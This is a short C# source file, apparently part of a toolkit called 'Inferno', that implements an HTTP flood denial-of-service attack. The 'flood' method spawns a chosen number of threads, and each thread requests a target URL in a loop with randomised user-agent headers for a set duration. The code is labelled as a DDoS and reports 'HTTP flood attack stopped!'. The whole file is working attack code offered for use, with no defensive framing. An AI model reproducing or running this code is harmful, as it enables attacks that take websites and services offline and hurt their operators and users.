using System;
using System.Collections.Generic;
using System.Net;
using System.Threading;

namespace Inferno
{
    internal class http
    {

        // Output
        private static dynamic output = new System.Dynamic.ExpandoObject();

        // Threads list
        private static List<Thread> threadsList = new List<Thread>();

        // Send packet
        private static void send(string target, int seconds)
        {
            if (!target.StartsWith("http")) { target = "http://" + target; }
            WebClient bot = new WebClient();
            bot.Headers.Add("user-agent", network.randomAgent());
            DateTime d = DateTime.Now.AddSeconds(seconds);
            while (DateTime.Compare(DateTime.Now, d) < 0)
            {
                try
                {
                    bot.DownloadString(target);
                } catch (WebException) { }
                
            }
            bot.Dispose();
        }
        // DDOS
        public static void flood(string target, int threads, int seconds)
        {
            // Start threads
            for (int i = 0; i < threads; i++)
            {
                Thread thread = new Thread(() => send(target, seconds));
                thread.Start();
                threadsList.Add(thread);
            }

            // Wait for stop threads
            foreach (Thread thread in threadsList)
            {
                if (thread.IsAlive) { thread.Join(); }
            }

            // Show output
            output.target = target;
            output.threads = threads;
            output.seconds = seconds;
            core.Exit("HTTP flood attack stopped!", output);
        }
    }
}
